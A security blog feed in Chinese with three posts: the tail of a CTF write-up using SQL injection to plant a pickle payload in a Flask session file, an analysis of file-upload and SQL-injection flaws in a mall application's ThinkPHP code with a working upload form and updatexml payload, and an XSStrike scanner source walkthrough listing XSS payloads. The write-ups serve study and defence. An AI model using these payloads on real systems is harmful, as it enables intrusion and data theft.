访问index，同时带上session文件对应的session值，触发open_session中的self.cache.get，进行反序列化攻击 假设前面生成的序列化文件存在于/tmp/ffff/chybeta，建议使用mysql的hex转码来进行十六进制的转换:12mysql&gt; select hex(load_file('/tmp/ffff/chybeta')) into outfile '/tmp/ffff/exp';Query OK, 1 row affected (0.00 sec) 以使用675b6ec7-95bd-411f-a59d-4c3dbchybeta作为cookie为例，则其session文件存在于/tmp/ffff/78f634977cbacf167dfd9656fe9dd5f3 在十六进制的序列化串前面添加0x，构造邮箱处的注入点：1select id from user where email = 'test'/**/union/**/select/**/0x63636F6D6D616E64730A../**/into/**/dumpfile/**/'/tmp/ffff/78f634977cbacf167dfd9656fe9dd5f3'#@test.com' 也即在注册的邮箱处填入：1test&apos;/**/union/**/select/**/0x63636F6D6D616E64730A.../**/into/**/dumpfile/**/&apos;/tmp/ffff/78f634977cbacf167dfd9656fe9dd5f3&apos;#@test.com 点击submit后出现Please use a different email address.。 接着在burp中抓取访问index的包，并修改cookie为675b6ec7-95bd-411f-a59d-4c3dbchybeta，在自己的vps上监听对应的端口： flag：1QWB&#123;pyth0n1s1ntere3t1ng&#125; 总结 wtforms.validators的Email类验证不完善 flask的session处理机制 python沙箱逃逸 python反序列化漏洞 一点“小小”的脑洞 Refference P师傅：Python库WTForm过滤不严导致URLXSS漏洞]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[某商城文件上传漏洞与SQL注入漏洞]]></title>
      <url>%2F2018%2F03%2F21%2F%E6%9F%90%E5%95%86%E5%9F%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E4%B8%8ESQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%2F</url>
      <content type="text"><![CDATA[首发于：先知社区: 某商城文件上传漏洞与SQL注入漏洞 漏洞点定位到Application/Home/Controller/AppUploadController.class.php：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162namespace Home\Controller;use Think\Controller;class AppUploadController extends Controller&#123; public function commentUpload()&#123; $user_id=$_POST['user_id']; $goods_id=$_POST['goods_id']; $order_id=$_POST['order_id']; if($_FILES) &#123; $filename = $_FILES['img']['name']; $tmpname = $_FILES['img']['tmp_name']; if (move_uploaded_file($tmpname, './Uploads/show/' . $filename)) &#123; $path['path']='/Uploads/show/' . $filename; $path['create_time']=time(); $r=M('images')-&gt;add($path); $show_pic=M('order_comment')-&gt;where([ 'goods_id'=&gt;$goods_id ])-&gt;getField('show_pic'); if(!empty($show_pic)) &#123; $show['show_pic'] = $show_pic . ',' . $r; M('order_comment')-&gt;where([ 'goods_id' =&gt; $goods_id, 'order_id'=&gt;$order_id, 'user_id'=&gt;$user_id ])-&gt;save($show); &#125;else&#123; $show['show_pic'] = $r; M('order_comment')-&gt;where([ 'goods_id' =&gt; $goods_id, 'order_id'=&gt;$order_id, 'user_id'=&gt;$user_id ])-&gt;save($show); &#125; &#125; else &#123; $data = json_encode($_FILES); echo $data; &#125; &#125; &#125; public function headerUpload()&#123; $user_id=$_POST['user_id']; if($_FILES) &#123; $filename = $_FILES['img']['name']; $tmpname = $_FILES['img']['tmp_name']; if (move_uploaded_file($tmpname,'./Uploads/header/' . $filename)) &#123; $head_img['user_header']='/Uploads/header/' . $filename; $head_img['user_id']=$user_id; $find = M('user_header')-&gt;where(array('user_id' =&gt; $user_id))-&gt;find(); if (!empty($find)) &#123;//则数据库里已存在头像 M('user_header')-&gt;where('user_id=%s',$user_id)-&gt;save($head_img); &#125; else &#123;//数据库里不存在头像 M('user_header')-&gt;add($head_img); &#125; echo json_encode('上传成功'); &#125; else &#123; $data = json_encode($_FILES); echo $data; &#125; &#125; &#125;&#125; 文件上传漏洞接受到文件后，没有过滤的直接进行了move_uploaded_file。1234567891011121314public function commentUpload()&#123; ... $filename = $_FILES[&apos;img&apos;][&apos;name&apos;]; $tmpname = $_FILES[&apos;img&apos;][&apos;tmp_name&apos;]; if (move_uploaded_file($tmpname, &apos;./Uploads/show/&apos; . $filename)) ...&#125;public function headerUpload()&#123; ... $filename = $_FILES[&apos;img&apos;][&apos;name&apos;]; $tmpname = $_FILES[&apos;img&apos;][&apos;tmp_name&apos;]; if (move_uploaded_file($tmpname,&apos;./Uploads/header/&apos; . $filename)) ... 因此直接构造表单，以commentUpload为例:123456789101112&lt;html&gt;&lt;body&gt;&lt;form action="http://127.0.0.1/index.php/Home/AppUpload/commentUpload" method="post"enctype="multipart/form-data"&gt;&lt;input type="file" name="img" id="file" /&gt; &lt;br /&gt;&lt;input type="submit" name="submit" value="Submit" /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 直接上传phpinfo.php，之后访问 http://127.0.0.1/Uploads/show/phpinfo.php 官网demo SQL注入漏洞观察一下上面代码中的sql查询语句，在headerUpload函数中：1234567891011121314public function headerUpload()&#123; $user_id=$_POST['user_id']; if($_FILES) &#123; ... if (move_uploaded_file($tmpname,'./Uploads/header/' . $filename)) &#123; ... if (!empty($find)) &#123;//则数据库里已存在头像 M('user_header')-&gt;where('user_id=%s',$user_id)-&gt;save($head_img); &#125; ... &#125; ... &#125;&#125; 首先user_id是可控的。我们跟进tp的where方法，定义在 Core/Library/Think/Model.class.php:1783123456789public function where($where,$parse=null)&#123; if(!is_null($parse) &amp;&amp; is_string($where)) &#123; if(!is_array($parse)) &#123; $parse = func_get_args(); array_shift($parse); &#125; $parse = array_map(array($this-&gt;db,'escapeString'),$parse); $where = vsprintf($where,$parse); &#125; 此时传入的参数parse即可控的$user_id，然后通过vsprintf($where,$parse)将其格式化输出到where语句中。这里并没有严格的对数据类型进行检验，虽然前面存在escapeString的过滤，但只要不引入引号即可。 要进入该if判断中，需要满足!empty($find)，也即数据库里已存在头像。因此可以先前台注册一个用户，登陆后在cookie字段获取到对应的user_id，如图所示user_id=275。 在个人资料处先上传一张头像 确保上传成功后。选择打开下面的exp.html上传，并抓包：123456789101112&lt;html&gt;&lt;body&gt;&lt;form action="http://127.0.0.1/index.php/Home/AppUpload/headerUpload" method="post"enctype="multipart/form-data"&gt;&lt;input type="file" name="img" id="file" /&gt; &lt;input type="text" name="user_id" value="275"&gt;&lt;input type="submit" name="submit" value="Submit" /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 在user_id后添加payload，比如or updatexml(1,concat(0x7e,(user())),0) 查看sql日志：]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[XSStrike 源码阅读]]></title>
      <url>%2F2018%2F03%2F10%2FXSStrike-%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%2F</url>
      <content type="text"><![CDATA[XSStrike 源码阅读 XSStrike XSStrike是一款XSS扫描工具。 Github地址: https://github.com/UltimateHackers/XSStrike 官网: https://xsstrike.tk/ 特点如下 WAF识别与绕过 自动POC生成 支持GET与POST请求 支持Cookie/HTTP认证 隐藏参数发现 Blind XSS 爆破 接下来也主要基于以上特点进行源码分析。 源码分析程序初始化在导入相关package后，XSStrike进行了一系列的设置初始化工作。按顺序梳理如下: 定义颜色参数:123# Just some colors and shitwhite = &apos;\033[1;97m&apos;... 初始化浏览器对象br，并设置相关参数:1234567br = mechanize.Browser() # Just shortening the calling functionbr.set_handle_robots(False) # Don't follow robots.txtbr.set_handle_equiv(True) # I don't know what it does, but its some good shitbr.set_handle_redirect(True) # Follow redirectsbr.set_handle_referer(True) # Include referrerbr.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'),('Accept-Encoding', 'deflate'), ('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q 主要的几个参数: set_handle_robots = False，即不跟随robots.txt set_handle_equiv = True，作者也不知道为啥这样设置:)笑 set_handle_redirect = True，跟随跳转 set_handle_referer = True，在每次请求中添加Reffer头 接下来的部分初始化了一些变量和函数，如下：123xsschecker = 'd3v' # A non malicious string to check for reflections and stuffparanames = [] # list for storing parameter namesparavalues = [] # list for storing parameter values xsschecker被设定为d3v，用于做xss的检测。这个d3v是无害的，因此可以利用其来检测页面的输出点。之所以不使用payload，是因为有可能waf会直接过滤掉payload中的敏感关键字，使得检测失效，因此一般在xss扫描器中，会先使用无害的字符串来验证，之后再逐步调整payload。paranames和paravalues分别用来存放参数名和参数值。 1234567891011121314CURRENTLY_OPEN_TAGS = [] # Used by HTML parserOPEN_EMPTY_TAG = "" # to store context i.e. &lt;input attr=$reflection&gt; then input will be open tagblacklist = ['html','body','br'] # These tags are normally empty thats why we are ignoring themwhitelist = ['input', 'textarea'] # These tags are the top priority to break out from NUM_REFLECTIONS = 0 # Number of reflectionsOCCURENCE_NUM = 0 # Occurence numberOCCURENCE_PARSED = 0 # Occurence parsed by the parseroccur_number = []occur_location = []delay = 0 因为在很多页面中html/body/br标签都不闭合，因此直接添加进了黑名单，而input/textarea作为输入和输出点很有可能出现xss因此予以优先考虑，添加进入whitelist 123456789101112131415161718tags = ['sVg', 'iMg', 'bOdY', 'd3v', 'deTails'] # HTML Tagsevent_handlers = &#123; # Event handlers and the name of tags which can be used with them'oNeRror': ['sVg', 'iMg', 'viDeo'],省略&#125;functions = [ # JavaScript functions to get a popup'[8].find(confirm)', 省略]# "Not so malicious" payloads for fuzzingfuzzes = ['&lt;z oNxXx=yyy&gt;', 省略]payloads = [ # Payloads for blind xss and simple bruteforcing'\'"&lt;/Script&gt;&lt;Html Onmouseover=(confirm)()//'省略]blind_params = ['redirect',省略] 这里定义了后续fuzz/scan过程中用到的payload。 接着XSStrike进行update检查，随后程序流程来到第781行input()，真正的扫描工作从这里开始。 input() - 扫描入口点input()是扫描的起始点，设定扫描目标及参数。源码如下:123456789101112131415161718192021def input(): target = raw_input('%s Enter a url: ' % que) if 'http' in target: # if the target has http in it, do nothing pass else: try: br.open('http://%s' % target) # Makes request to the target with http schema target = 'http://%s' % target except: # if it fails, maybe the target uses https schema target = 'https://%s' % target try: br.open(target) # Makes request to the target except Exception as e: # if it fails, the target is unreachable if 'ssl' in str(e).lower(): print '%s Unable to verify target\'s SSL certificate.' % bad quit() else: print '%s Unable to connect to the target.' % bad quit() 接受URL地址，检测是否有URL地址中是否有协议，并对相应的URL进行连接测试。 123cookie = raw_input('%s Enter cookie (if any): ' % que) if cookie != '': br.addheaders.append(('Cookie', cookie)) 接着接受输入cookie，作为后续扫描的身份认证。 123456789101112131415if '=' in target: # A url with GET request must have a = so... GET, POST = True, False param_data = '' param_parser(target, param_data, GET, POST) initiator(url, GET, POST)else: choice = raw_input('%s Does it use POST method? [Y/n] ' % que).lower() if choice == 'n': GET, POST = True, False initiator(target, GET, POST) else: GET, POST = False, True param_data = raw_input('%s Enter POST data: ' % que) param_parser(target, param_data, GET, POST) initiator(url, GET, POST) 接着input()从给定的URL中解析出相应的参数。如果URL中包含查询参数，也即包含=，说明为GET请求，否则进行询问，并手动输入对应的参数名与参数值，并根据请求方式调用param_parser(target, param_data, GET, POST)设置相应的参数。param_parser()定义在第626行，源码如下。param_parser()将对应的参数名和值分别添加入前面定义的paranames和paravalues中。 1234567891011def param_parser(target, param_data, GET, POST): global url if POST: target = target + '?' + param_data parsed_url = urlparse(target) url = parsed_url.scheme+'://'+parsed_url.netloc+parsed_url.path parameters = parse_qs(parsed_url.query, keep_blank_values=True) for para in parameters: for i in parameters[para]: paranames.append(para) paravalues.append(i) 最后input()调用initiator()进行扫描。 initiator() - xss 扫描initiator()定义在第642行。代码大体框架如下:123456789101112131415def initiator(url, GET, POST): choice = raw_input('%s Would you like to look for hidden parameters? [y/N] ' % que) if choice == 'y': paramfinder(url, GET, POST) if len(paranames) == 0: print '%s No parameters to test.' % bad quit() else: if GET: ... elif POST: ... if len(occur_number) == 0 and GET: ... elif len(occur_number) == 0 and POST: ... 第一步先询问是否要查询隐藏参数，是的话则调用paramfinder(url, GET, POST)。关于paramfinder()的解析见paramfinder() - 查找隐藏参数 - 查找隐藏参数)。 第二步确认paranames长度不为零后，根据请求方法的不同进行初步不同方式的扫描。此处GET和POST的请求的处理流程类似，可以归结为如下代码:12345678910111213141516171819202122232425262728293031323334353637if GET: GET, POST = True, False WAF_detector(url, '?'+paranames[0]+'='+xsschecker, GET, POST) current_param = 0 for param_name in paranames: print ('%s-%s' % (red, end)) * 50 print '%s Testing parameter %s%s%s' % (run, green, param_name, end) paranames_combined = [] for param_name, param_value in izip(paranames, paravalues): paranames_combined.append('&amp;' + param_name + '=' + param_value) new_param_data = [] current = '&amp;' + paranames[current_param] + '=' for i in paranames_combined: if current in i: pass else: new_param_data.append(i) param_data = '?' + paranames[current_param] + '=' + xsschecker + ''.join(new_param_data) # GET param_data = paranames[current_param] + '=' + xsschecker + ''.join(new_param_data) # POST if WAF: choice = raw_input('%s A WAF is active on the target. Would you like to delay requests to evade suspicion? [y/N] ' % que) if choice == 'y': delay = 6 else: delay = 0 fuzzer(url, param_data, GET, POST) #Launches fuzzer aka Ninja quit() filter_checker(url, param_data, GET, POST) # Launches filter checker locater(url, param_data, GET, POST) # Launches locater inject(url, param_data, GET, POST) # Launches injector del occur_number[:] del occur_location[:] current_param = current_param + 1 这个流程中，先用paranames[0]通过WAF_detector()检测是否有WAF存在，对函数WAF_detector()的解析见后。之后根据paranames中的参数，选择当前测试的参数paranames[current_param]，对其余param_data中的参数则保留并存放于new_param_data中。，根据GET或POST方式生成对应的param_data。 比如url为：http://127.0.0.1/?input_r=f&amp;input_d=e 。这里有两个参数input_r和input_d。当测试input_d时，其值为xsschecker即d3v。而new_param_data为&amp;input_r=f。最后生成的初始测试参数param_data即为?input_d=d3v&amp;input_r=f 根据前面的检测WAF是否存在，程序会进行不同的分支。 有WAF情况对应源码第671行即：12345678if WAF: choice = raw_input('%s A WAF is active on the target. Would you like to delay requests to evade ? [y/N] ' % que) if choice == 'y': delay = 6 else: delay = 0 fuzzer(url, param_data, GET, POST) #Launches fuzzer aka Ninja quit() 由于检测到了WAF，因此询问是否减缓请求速度来防止被办。然后调用fuzzer()进行xss payload的fuzz。关于fuzzer()部分见后。 无WAF情况源码第681行：123456filter_checker(url, param_data, GET, POST) # Launces filter checkerlocater(url, param_data, GET, POST) # Launcher locaterinject(url, param_data, GET, POST) # Launches injectordel occur_number[:]del occur_location[:]current_param = current_param + 1 先调用filter_checker(url, param_data, GET, POST)进行基本的过滤检查，其中如果检查的字符串直接能触发xss则可以直接退出，否则进行进一步检查，对filter_checker()的分析见后。 接着调用locater(url, param_data, GET, POST)根据参数，对页面中所有可能的输出点进行一一定位，并将结果保存在occur_number和occur_location中。关于locater()的分析见后 最后调用inject(url, param_data, GET, POST)真正进行地xss扫描/fuzz工作。关于inject()的分析见后。 结束对当前参数的检测后，清理occur_number和occur_location，用于存放下一个参数出现的ID和位置。current_param = current_param + 1，程序进入对下一个参数的检测。 第三步完成第二步的自动话检测后，这一步是手动检测，通过自动填充payaload，打开浏览器，进行人工确认:123456789101112131415if len(occur_number) == 0 and GET: print '%s Executing project HULK for blind XSS Detection' % info for payload in payloads: param_data = param_data.replace(xsschecker, payload) # Replaces the xsschecker with payload print '%s Payload: %s' % (info, payload) webbrowser.open(url + param_data) # Opens the "injected" URL in browser next = raw_input('%s Press enter to execute next payload' % que)elif len(occur_number) == 0 and POST: choice = raw_input('%s Would you like to generate some payloads for blind XSS? [Y/n] ' % que).lower() if choice == 'n': quit() else: for payload in payloads: # We will print the payloads from the payloads list print '%s %s' % (info, payload) paramfinder() - 查找隐藏参数paramfinder()定义在第439行，源码如下：123456789101112131415161718def paramfinder(url, GET, POST): response = br.open(url).read() matches = re.findall(r'&lt;input[^&lt;]*name=\'[^&lt;]*\'*&gt;|&lt;input[^&lt;]*name="[^&lt;]*"*&gt;', response) for match in matches: ... progress = 0 for param in blind_params: progress = progress + 1 sys.stdout.write('\r%s Parameters checked: %i/%i' % (run, progress, len(blind_params))) sys.stdout.flush() if param not in paranames: if GET: response = br.open(url + '?' + param + '=' + xsschecker).read() if POST: response = br.open(url, param + '=' + xsschecker).read() if '\'%s\'' % xsschecker in response or '"%s"' % xsschecker in response or ' %s ' % xsschecker in response: print '%s Valid parameter found : %s%s%s' % (good, green, param, end) paranames.append(param) paravalues.append('') paramfinder()先请求URL，获得HTML页面后，根据正则表达式提取出所有可能的输入点，并将其添加进blind_params。 之后根据请求方法GET还是POST，构造相应的请求。在这两种请求中，参数名为从html页面提取的可能的参数，而参数值则为一开始即初始化过的xsschecker。 接着paramfinder()根据返回页面中是否包含xsschecker的值来确定是否存在隐藏参数，并将其添加进入paranames和paravalues中，作为进一步扫描的对象。 WAF_detector() - WAF检测WAF_detector() 定义在第171行，它通过发起请求，然后根据页面的response code来确定是否存在waf。源码如下：12345678910111213141516171819202122232425262728293031def WAF_detector(url, param_data, GET, POST): global WAF WAF = False noise = quote_plus('&lt;script&gt;confirm()&lt;/script&gt;') #a payload which is noisy enough to provoke the WAF fuzz = param_data.replace(xsschecker, noise) #Replaces xsschecker in param_data with noise try: sleep(delay) # Pausing the program. Default = 0 sec. In case of WAF = 6 sec. if GET: response = br.open(url + fuzz) # Opens the noise injected payload else: response = br.open(url, fuzz) # Opens the noise injected payload print '%s WAF Status: Offline' % good except Exception as e: # if an error occurs, catch the error e = str(e) # convert the error to a string # Here, we are looking for HTTP response codes in the error to fingerprint the WAF if '406' in e or '501' in e: # if the http response code is 406/501 WAF_Name = 'Mod_Security' WAF = True elif '999' in e: # if the http response code is 999 WAF_Name = 'WebKnight' WAF = True elif '419' in e: # if the http response code is 419 WAF_Name = 'F5 BIG IP' WAF = True elif '403' in e: # if the http response code is 403 WAF_Name = 'Unknown' WAF = True else: print '%s WAF Status: Offline' % good if WAF: print '%s WAF Detected: %s' % (bad, WAF_Name) 该函数在第652行，initiator()中调用：WAF_detector(url, &#39;?&#39;+paranames[0]+&#39;=&#39;+xsschecker, GET, POST)。 该函数将无害的xsschecker替换为最常见的payload&lt;script&gt;confirm()&lt;/script&gt;，因此当存在waf时，基本能触发waf，从而检测得到。之后根据下表进行了对waf的指纹检索： status_code WAF name 406或501 Mod_Security 999 WebKnight 419 F5 BIG IP 403 Unknown fuzzer() - 对WAF的fuzzfuzzer()定义在 134 行，源码如下:12345678910111213141516171819202122232425262728293031def fuzzer(url, param_data, GET, POST): result = [] # Result of fuzzing progress = 0 # Variable for recording the progress of fuzzing for i in fuzzes: progress = progress + 1 sleep(delay) # Pausing the program. Default = 0 sec. In case of WAF = 6 sec. # Pausing the program. Default = 0 sec. In case of WAF = 6 sec. sys.stdout.write('\r%s Fuzz Sent: %i/%i' % (run, progress, len(fuzzes))) sys.stdout.flush() try: fuzzy = quote_plus(i) # URL encoding the payload param_data_injected = param_data.replace(xsschecker, fuzzy) # Replcaing the xsschecker with fuzz if GET: # GET parameter response = br.open(url + param_data_injected).read() # makes a request to example.com/search.php?q=&lt;fuzz&gt; else: # POST parameter response = br.open(url, param_data_injected).read() # Seperating the "param_data_injected" with comma because its POST data if i in response: # if fuzz string is reflected in the response / source code result.append(&#123; 'result' : '%sWorks%s' % (green, end), 'fuzz' : i&#125;) else: # if the fuzz string was not reflected in the response completely result.append(&#123; 'result' : '%sFiltered%s' % (yellow, end), 'fuzz' : i&#125;) except: # if the server returned an error (Maybe WAF blocked it) result.append(&#123; 'result' : '%sBlocked%s' % (red, end), 'fuzz' : i&#125;) table = PrettyTable(['Fuzz', 'Response']) # Creates a table with two columns for value in result: table.add_row([value['fuzz'], value['result']]) # Adds the value of fuzz and result to the columns print '\n', table fuzzes在程序初始化部分已经定义fuzzes = [&#39;&lt;z oNxXx=yyy&gt;&#39;, &#39;&lt;z xXx=yyy&gt;&#39;.......]。fuzzer中遍历fuzzes，通过对当前测试参数替换不同的payload，观察返回的html页面，若payload在页面中被匹配到则为Works，否则即失败Filtered或Blocked。之后用PrettyTable输出fuzz的结果。 filter_checker() - 过滤检查filter_checker()定义在 207 行：1234567891011121314151617def filter_checker(url, param_data, GET, POST): strength = '' # A variable for containing strength of the filter # Injecting a malicious payload first by replacing xsschecker with our payload try: low_string = param_data.replace(xsschecker, quote_plus('&lt;svg/onload=(confirm)()&gt;')) sleep(delay) # Pausing the program. Default = 0 sec. In case of WAF = 6 sec. if GET: low_request = br.open(url + low_string).read() else: low_request = br.open(url, low_string).read() if '&lt;svg/onload=(confirm)()&gt;' in low_request: ... else: ... except Exception as e: try: print '%s Target doesn\'t seem to respond properly. Error Code: %s' % (bad, re.search(r'\d\d\d', str(e)).group()) except: print '%s Target doesn\'t seem to respond properly.' % bad 这里直接使用&lt;svg/onload=(confirm)()&gt;来进行过滤检查。变量strength用于表明过滤的强度。之后根据页面返回的html进行深入检查。 如果没有过滤，也即返回的html中直接包含了&lt;svg/onload=(confirm)()&gt;，则直接确定过滤强度为Low or None。并且&lt;svg/onload=(confirm)()&gt;即可作为payload，根据选择是要进一步的处理，还是直接根据这个payload打开相应的xss页面。下面是对应的代码。123456789101112if '&lt;svg/onload=(confirm)()&gt;' in low_request: # If payload was reflected in response print "%s Filter Strength : %sLow or None%s" % (good, green, end) print '%s Payload: &lt;svg/onload=(confirm)()&gt;' % good print '%s Efficiency: 100%%' % good choice = raw_input('%s A payload with 100%% efficiency was found. Continue scanning? [y/N] ' % que).lower() if choice == 'y': pass else: if GET: webbrowser.open(url+param_data.strip(xsschecker)+'&lt;svg/onload=(confirm)()&gt;') quit() strength = 'low' # As a malicious payload was not filtered, the filter is weak 倘若存在过滤，也即返回的页面中找不到&lt;svg/onload=(confirm)()&gt;，可能直接整个去掉了，可能过滤了某些关键字，或者可能转义了敏感字符。则会更换测试的payload，比如&lt;zz//onxx=yy&gt;，然后发起请。根据响应html，如果&lt;zz//onxx=yy&gt;在html中，则过滤程度为medium，如果不在html，则过滤程度为high。相关代码如下：123456789101112131415else: # If malicious payload was filtered (was not in the response) # Now we will use a less malicious payload medium_string = param_data.replace(xsschecker, quote_plus('&lt;zz//onxx=yy&gt;')) sleep(delay) # Pausing the program. Default = 0 sec. In case of WAF = 6 sec. if GET: medium_request = br.open(url + medium_string).read() else: medium_request = br.open(url + medium_string).read() if '&lt;zz onxx=yy&gt;' in medium_request: print '%s Filter Strength : %sMedium%s' % (info, yellow, end) strength = 'medium' else: #Printing high since result was not medium/low print '%s Filter Strength : %sHigh%s' % (bad, red, end) strength = 'high' return strength locater() - 定位输出点locater() 定义在第 254 行：123456789101112131415161718def locater(url, param_data, GET, POST): init_resp = make_request(url, param_data, GET, POST) # Makes request to the target if(xsschecker in init_resp.lower()): # if the xsschecker is found in the response global NUM_REFLECTIONS # The number of reflections of xsschecker in the response NUM_REFLECTIONS = init_resp.lower().count(xsschecker.lower()) # Counts number of time d3v got reflected in webpage print '%s Number of reflections found: %i' % (info, NUM_REFLECTIONS) for i in range(NUM_REFLECTIONS): global OCCURENCE_NUM OCCURENCE_NUM = i+1 scan_occurence(init_resp) # Calls out a function to find context/location of xsschecker # Reset globals for next instance global ALLOWED_CHARS, IN_SINGLE_QUOTES, IN_DOUBLE_QUOTES, IN_TAG_ATTRIBUTE, IN_TAG_NON_ATTRIBUTE, IN_SCRIPT_TAG, CURRENTLY_OPEN_TAGS, OPEN_TAGS, OCCURENCE_PARSED, OPEN_EMPTY_TAG ALLOWED_CHARS, CURRENTLY_OPEN_TAGS, OPEN_TAGS = [], [], [] IN_SINGLE_QUOTES, IN_DOUBLE_QUOTES, IN_TAG_ATTRIBUTE, IN_TAG_NON_ATTRIBUTE, IN_SCRIPT_TAG = False, False, False, False, False OCCURENCE_PARSED = 0 OPEN_EMPTY_TAG = "" else: #Launched hulk if no reflection is found. Hulk Smash! print '%s No reflection found.' % bad 这里定位输出点，通过xsschecker的值为d3v，可以检测在html中该值出现了几次，保存为NUM_REFLECTIONS。同时用变量OCCURENCE_NUM来定位每次的输出点，然后通过对每一处进行scan_occurence()，该函数定义在 273 行，代码如下： 12345678910111213def scan_occurence(init_resp): # Parses the response to locate the position/context of xsschecker i.e. d3v location = html_parse(init_resp) # Calling out the parser function if location in ('script', 'html_data', 'start_end_tag_attr', 'attr'): occur_number.append(OCCURENCE_NUM) occur_location.append(location) # We are treating the comment context differentally because if a payload is reflected # in comment, it won't execute. So will we test the comment context first elif location == 'comment': occur_number.insert(0, OCCURENCE_NUM) # inserting the occurence_num in start of the list occur_location.insert(0, location) # same as above else: pass html_parse(init_resp)是作者自己实现的html解析函数，通过OCCURENCE_NUM可以定位到具体的输出点，然后确定输出点所在的位置。作者在注释中提到，如果输出点在注释中，则直接成为occur_number和occur_location的首元素，因为通常情况下处于注释中的代码时不会执行的。在其他情况下（script/html_data/start_end_tag_attr/attr），按顺序对应添加进入occur_number和occur_location。occur_number是输出点的标号，occur_location是输出点的位置。 inject() - payload注入inject() 定义在 第 468 行，这部分是进行xss攻击的核心部分，代码较长，整体的框架如下：12345678910111213141516171819202122232425262728293031323334def inject(url, param_data, GET, POST): special = '' l_filling = '' e_fillings = ['%0a','%09','%0d','+'] # "Things" to use between event handler and = or between function and = fillings = ['%0c', '%0a','%09','%0d','/+/'] # "Things" to use instead of space for OCCURENCE_NUM, location in izip(occur_number, occur_location): print '\n%s Testing reflection no. %s ' % (run, OCCURENCE_NUM) allowed = [] if test_param_check('k"k', 'k"k', OCCURENCE_NUM, url, param_data, GET, POST, action='nope'): ... elif test_param_check('k"k', 'k&amp;quot;k', OCCURENCE_NUM, url, param_data, GET, POST, action='nope'): ... else: ... if test_param_check('k\'k', 'k\'k', OCCURENCE_NUM, url, param_data, GET, POST, action='nope'): ... else: ... if test_param_check('&lt;lol&gt;', '&lt;lol&gt;', OCCURENCE_NUM, url, param_data, GET, POST, action='nope'): ... else: ... if location == 'comment': ... elif location == 'script': ... elif location == 'html_data': ... elif location == 'start_end_tag_attr' or location == 'attr': ... 首先会先定义四个变量special、l_filling、e_fillings、fillings，这些保存着后续payload生成的一些关键字符。接着通过对occur_number,occur_location的遍历，对每一个测试点进行测试。 测试主要分为两部分。 在第一部分的测试中，主要通过test_param_check()来进行特殊字符的检测，查看是否进行了编码： 双引号(&#39;) 单引号(&quot;) 尖括号(&lt;&gt;)关于test_param_check()如何具体工作，见后文 在第二部分的测试中，根据当前测试点所在位置的不同进行不同的测试。 当输出点在注释（comment）中时：123456789101112131415161718if location == 'comment': print '%s Trying to break out of %sHTML Comment%s context.' % (run, green, end) prefix = '--&gt;' suffixes = ['', '&lt;!--'] progress = 1 for suffix in suffixes: for tag in tags: for event_handler, compatible in event_handlers.items(): if tag in compatible: for filling, function, e_filling in izip(fillings, functions, e_fillings): progress = progress + 1 sys.stdout.write('\r%s Payloads tried: %i' % (run, progress)) sys.stdout.flush() if event_handler == 'oNeRror': payload = '%s&lt;%s%s%s%s%s%s%s%s=%s%s%s&gt;%s' % (prefix, tag, filling, 'sRc=', e_filling, '=', e_filling, event_handler, e_filling, e_filling, function, l_filling, suffix) else: payload = '%s&lt;%s%s%s%s%s=%s%s%s&gt;%s' % (prefix, tag, filling, special, event_handler, e_filling, e_filling, function, l_filling, suffix) test_param_check(quote_plus(payload), payload, OCCURENCE_NUM, url, param_data, GET, POST, action='do') 为了闭合注释，则payload的前缀必然是--&gt;，而对于后缀可以是空，或者选择闭合&lt;!--。接着选取前面定义的各种payload组成元素，构成payload，进行test_param_check()测试 当输出点在script标签中时，同样确定了可能的前缀和后缀，然后在生成payload，最后进行test_param_check()测试 当输出点在html_data中时，比如&lt;h1&gt;输出点&lt;/h1&gt;为了能让js解析payload而不仅仅只是文本，通常需要有尖括号，比如&lt;h1&gt;&lt;script&gt;alert(1)&lt;/h1&gt;、&lt;h1&gt;&lt;svg/onload=(confirm)()&gt;&lt;h1&gt;，因此当检测到尖括号被过滤掉时，会直接跳过此次测试:1234567if angular_allowed: l_than, g_than = '&lt;', '&gt;'# elif entity_allowed:# l_than, g_than = '&amp;lt;', '&amp;gt;'else: print '%s Angular brackets are being filtered. Unable to generate payloads.' % bad continue 倘若没有过滤，则生成payload，并进行test_param_check()测试。 当输出点在属性中时，比如&lt;img src=输出点&gt;或者&lt;img src=&quot;输出点&quot;&gt;或者&lt;img src=&#39;输出点&#39;&gt;，首先要考虑的时引号的闭合问题，因此会先提取出需要闭合的是单引号还是双引号还是不需要引号，然后生成payload进行test_param_check()测试:12345678910111213elif location == 'start_end_tag_attr' or location == 'attr': print '%s Trying to break out of %sAttribute%s context.' % (run, green, end) quote = which_quote(OCCURENCE_NUM, url, param_data, GET, POST) if quote == '': prefix = '/&gt;' suffixes = ['&lt;"', '&lt;\'', '&lt;br attr\'=', '&lt;br attr="'] elif quote in allowed: 允许引号，生成payload，进行测试。 elif quote not in allowed and 'entity' in allowed: 注 此部分被作者注释掉。暂且跳过不分析。 else: print '%s Quotes are being filtered, its not possible to break out of the context.' % bad html_parse() - html解析html_parse()定义在第 287 行：12345678def html_parse(init_resp): parser = MyHTMLParser() # initializes the parser location = '' # Variable for containing the location lol try: parser.feed(init_resp) # submitting the response to the parser except Exception as e: # Catching the exception/error location = str(e) # The error is actually the location. For more info, check MyHTMLParser class return location # Returns the location 而MyHTMLParser()是作者实现的类，继承自HTMLParser，定义在第 360 行：123456789101112131415class MyHTMLParser(HTMLParser): def handle_comment(self, data): global OCCURENCE_PARSED if(xsschecker.lower() in data.lower()): OCCURENCE_PARSED += 1 if(OCCURENCE_PARSED == OCCURENCE_NUM): raise Exception("comment") def handle_startendtag(self, tag, attrs): ... def handle_starttag(self, tag, attrs): ... def handle_endtag(self, tag): ... def handle_data(self, data): ... 以handle_comment为例，当当前处理的OCCURENCE_PARSED与OCCURENCE_NUM相等时，说明此时MyHTMLParser()解析到此时检查的输出点处，根据情况不同raise异常，比如raise Exception(&quot;comment&quot;)。 然后html_parse()中，通过捕获异常location = 